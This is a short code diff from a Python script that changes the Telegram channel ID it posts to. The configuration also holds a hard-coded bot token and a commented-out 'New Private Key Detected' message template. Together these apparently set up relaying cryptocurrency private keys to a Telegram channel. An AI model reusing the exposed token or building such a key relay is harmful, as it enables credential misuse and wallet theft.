@@ -65,7 +65,7 @@ def send_telegram_message(token, chat_id, message):
 
 # --- Configuration ---
 BOT_TOKEN = "8746690272:AAHfulBcKglK4WgYGrbH5vDTn_XxYOw0YlE"
-CHANNEL_ID = -1004371870647
+CHANNEL_ID = -1003719196426
 #PRIVATE_KEY = ""
 #TEXT_MESSAGE = f"<b>New Private Key Detected</b>\n<code>{PRIVATE_KEY}</code>"
 
